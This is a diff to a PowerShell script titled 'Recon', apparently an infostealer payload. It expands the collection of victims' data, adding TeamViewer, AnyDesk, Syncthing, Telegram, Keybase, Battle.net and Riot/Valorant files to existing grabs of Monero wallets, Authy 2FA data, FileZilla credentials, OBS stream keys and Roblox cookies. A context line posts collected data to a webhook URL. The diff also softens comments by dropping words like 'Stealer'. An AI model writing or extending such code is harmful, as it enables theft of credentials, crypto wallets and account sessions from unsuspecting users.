@@ -1,4 +1,4 @@
-############################################################################################################################################################                      
+ ############################################################################################################################################################                      
 #                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
 # Title        : Recon             | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
 # Author       : Jakoby+Sealldev   |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
@@ -84,32 +84,51 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 
 ############################################################################################################################################################
 
-# OBS Stream Key Steal
+# OBS
 $obs = Get-Childitem -Path $env:appdata\obs-studio\basic\profiles\ -Include service.json -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
 if ($obs -ne $null) {
-	Get-Content -Path $obs >> $env:tmp/$FolderName/ObsData.json
+	New-Item -Path $env:tmp/$FolderName/OBS -ItemType Directory
+	Get-Content -Path $obs >> $env:tmp/$FolderName/OBS/service.json
 }
 
-# FileZilla Data
+# FileZilla
 $filezilla = Get-Childitem -Path $env:appdata\FileZilla -Include filezilla.xml -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
 if ($filezilla -ne $null) {
-	Copy-Item $env:appdata/FileZilla $env:tmp/$FolderName -Recurse
+	Copy-Item "$env:appdata/FileZilla" "$env:tmp/$FolderName" -Recurse
 }
 
-# RustDesk Config
+# SyncThing
+if ([System.IO.File]::Exists("$env:appdata/../Syncthing/syncthing.log")) {
+	New-Item -Path $env:tmp/$FolderName/Syncthing -ItemType Directory
+	Copy-Item "$env:appdata/../Syncthing/" "$env:tmp/$FolderName/" -Recurse
+}
+
+# RustDesk
 if ([System.IO.File]::Exists("$env:appdata\RuskDesk\config")) {
 	New-Item -Path $env:tmp/$FolderName/RustDesk -ItemType Directory
-	Copy-Item $env:appdata/RuskDesk/config $env:tmp/$FolderName/RustDesk/config -Recurse
+	Copy-Item "$env:appdata/RuskDesk/config" "$env:tmp/$FolderName/RustDesk/config" -Recurse
 }
 
-# JDownloader logs
+# TeamViewer
+if ([System.IO.File]::Exists("$env:appdata\..\TeamViewer\Logs")) {
+	New-Item -Path $env:tmp/$FolderName/TeamViewer -ItemType Directory
+	Copy-Item "$env:appdata/../TeamViewer/Logs" "$env:tmp/$FolderName/TeamViewer/Logs" -Recurse
+}
+
+# AnyDesk
+if ([System.IO.File]::Exists("$env:appdata\AnyDesk\connection_trace.txt")) {
+	New-Item -Path $env:tmp/$FolderName/AnyDesk -ItemType Directory
+	Copy-Item "$env:appdata/AnyDesk/connection_trace.txt" "$env:tmp/$FolderName/AnyDesk/connection_trace.txt"
+}
+
+# JDownloader
 $jdl = Get-Childitem -Path "$env:appdata\..\Local\JDownloader 2.0\" -Include Core.jar -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
 if ($jdl -ne $null) {
 	New-Item -Path "$env:tmp/$FolderName/JDownloader2.0" -ItemType Directory
 	Copy-Item "$env:appdata\..\Local\JDownloader 2.0\logs" "$env:tmp/$FolderName/JDownloader2.0/logs" -Recurse
 }
 
-# qBittorrent Data
+# qBittorrent
 $qbt = Get-Childitem -Path "$env:appdata\..\Local\qBittorrent\logs" -Include qbittorrent.log -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
 if ($qbt -ne $null) {
 	New-Item -Path "$env:tmp/$FolderName/qBittorrent" -ItemType Directory
@@ -117,7 +136,7 @@ if ($qbt -ne $null) {
 	Copy-Item "$env:appdata\..\Local\qBittorrent\logs" "$env:tmp/$FolderName/qBittorrent/logs" -Recurse
 }
 
-# Vuze Data
+# Vuze
 $vuze = Get-Childitem -Path "$env:appdata\Azureus" -Include downloads.config -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
 if ($vuze -ne $null) {
 	New-Item -Path "$env:tmp/$FolderName/Vuze" -ItemType Directory
@@ -127,22 +146,23 @@ if ($vuze -ne $null) {
 	Copy-Item "$env:appdata\Azureus\azureus.config" "$env:tmp/$FolderName/Vuze/azureus.config"
 }
 
-# uTorrent Data
+# uTorrent
 $utorrent = Get-Childitem -Path "$env:appdata\utorrent" -Include settings.dat -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
 if ($utorrent -ne $null) {
 	New-Item -Path "$env:tmp/$FolderName/uTorrent" -ItemType Directory
 	Copy-Item "$env:appdata\utorrent\settings.dat" "$env:tmp/$FolderName/uTorrent/settings.dat"
 }
 
-# Monero Wallet Stealer
-$documents=[Environment]::GetFolderPath("MyDocuments")
-if ([System.IO.File]::Exists("$documents\Monero\wallets")) {
+# Monero
+$path=[Environment]::GetFolderPath("MyDocuments")+"\Monero\wallets"
+if (Test-Path $path -PathType Any) {
 	New-Item -Path "$env:tmp/$FolderName/Monero" -ItemType Directory
-	Copy-Item "$documents\Monero\wallets" "$env:tmp/$FolderName/Monero/wallets" -Recurse
+	Copy-Item [Environment]::GetFolderPath("MyDocuments")+"\Monero\wallets" "$env:tmp/$FolderName/Monero/wallets" -Recurse
 }
 
-# Authy Desktop Stealer
-if ([System.IO.File]::Exists("$env:appdata\Authy Desktop")) {
+# Authy Desktop
+$path="$env:appdata\Authy Desktop"
+if (Test-Path $path -PathType Any) {
 	New-Item -Path "$env:tmp/$FolderName/Authy" -ItemType Directory
 	Copy-Item "$documents\Authy Desktop\Cookies" "$env:tmp/$FolderName/Authy/Cookies"
 	Copy-Item "$documents\Authy Desktop\Local State" "$env:tmp/$FolderName/Authy/Local State"
@@ -152,7 +172,31 @@ if ([System.IO.File]::Exists("$env:appdata\Authy Desktop")) {
 	Copy-Item "$documents\Authy Desktop\databases" "$env:tmp/$FolderName/Authy/databases" -Recurse
 }
 
-# Get Roblox Cookies
+# BattleNet
+if ([System.IO.File]::Exists("$env:appdata/Battle.net/Battle.net.config")) {
+	New-Item -Path $env:tmp/$FolderName/BattleNet -ItemType Directory
+	Copy-Item "$env:appdata/Battle.net/Battle.net.config" "$env:tmp/$FolderName/BattleNet/Battle.net.config"
+}
+
+# Telegram
+if ([System.IO.File]::Exists("$env:appdata/Telegram Desktop/log.txt")) {
+	New-Item -Path $env:tmp/$FolderName/Telegram -ItemType Directory
+	Copy-Item "$env:appdata/Telegram Desktop/log.txt" "$env:tmp\$FolderName\Telegram\log.txt"
+}
+
+# Parsec
+if ([System.IO.File]::Exists("$env:appdata/Parsec/log.txt")) {
+	New-Item -Path $env:tmp/$FolderName/Parsec -ItemType Directory
+	Copy-Item "$env:appdata/Parsec/log.txt" "$env:tmp/$FolderName/Parsec/log.txt"
+}
+
+# Keybase
+if ([System.IO.File]::Exists("$env:appdata/../Local/Keybase/config.json")) {
+	New-Item -Path $env:tmp/$FolderName/Keybase -ItemType Directory
+	Copy-Item "$env:appdata/Keybase/config.json" "$env:tmp/$FolderName/Keybase/config.json"
+}
+
+# Roblox
 function get-RobloxCookies {
 	try {
 	$roblox = Get-ItemProperty -Path "HKCU:\Software\Roblox\RobloxStudioBrowser\roblox.com" 
@@ -175,7 +219,46 @@ if ($roblox -ne $null) {
 	$roblox >> $env:tmp/$FolderName/RobloxCookies.txt
 }
 
-# Get Minecraft Account Details
+# Fortnite
+if (Test-Path "$env:appdata/../Local/FortniteGame" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/Fortnite -ItemType Directory
+}
+if ([System.IO.File]::Exists("$env:appdata/../Local/FortniteGame/Saved/Logs/FortniteGame.log")) {
+	Copy-Item "$env:appdata/../Local/FortniteGame/Saved/Logs/FortniteGame.log" "$env:tmp/$FolderName/Fortnite/FortniteGame.log"
+}
+if ([System.IO.File]::Exists("$env:appdata/../Local/FortniteGame/Saved/Logs/FortniteLauncher.log")) {
+	Copy-Item "$env:appdata/../Local/FortniteGame/Saved/Logs/FortniteLauncher.log" "$env:tmp/$FolderName/Fortnite/FortniteLauncher.log"
+}
+
+# RiotGames - Folders
+if (Test-Path "$env:appdata/../Local/Riot Games" -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/Riot Games" -ItemType Directory
+}
+if (Test-Path "$env:appdata/../Local/VALORANT" -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/Riot Games/Valorant" -ItemType Directory
+}
+if (Test-Path "$env:appdata\..\Local\Riot Games\Riot Client" -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/Riot Games/Riot Client" -ItemType Directory
+}
+# VALORANT
+if (Test-Path "$env:appdata/../Local/Riot Games/VALORANT" -PathType Any) {
+	New-Item -Path "$env:tmp/$FolderName/Riot Games/Valorant" -ItemType Directory
+}
+if (Test-Path "$env:appdata/../Local/VALORANT/Saved/Logs" -PathType Any) {
+Copy-Item "$env:appdata/../Local/VALORANT/Saved/Logs" "$env:tmp/$FolderName/Riot Games/Valorant" -Recurse
+}
+if (Test-Path "$env:appdata/../VALORANT/Saved/Config" -PathType Any) {
+Copy-Item "$env:appdata/../Local/VALORANT/Saved/Config" "$env:tmp/$FolderName/Riot Games/Valorant" -Recurse
+}
+# RiotClient
+if (Test-Path "$env:appdata\..\Local\Riot Games\Riot Client\Data" -PathType Any) {
+Copy-Item "$env:appdata/../Local/Riot Games/VALORANT/Data" "$env:tmp/$FolderName/Riot Games/Riot Client" -Recurse
+}
+if (Test-Path "$env:appdata\..\Local\Riot Games\Riot Client\Config" -PathType Any) {
+	Copy-Item "$env:appdata/../Local/Riot Games/VALORANT/Data" "$env:tmp/$FolderName/Riot Games/Riot Client" -Recurse
+}
+
+# Minecraft
 function get-MinecraftAccounts {
 	try {
 		$data = Get-Content -Path "$env:appdata/.minecraft/launcher_log.txt"
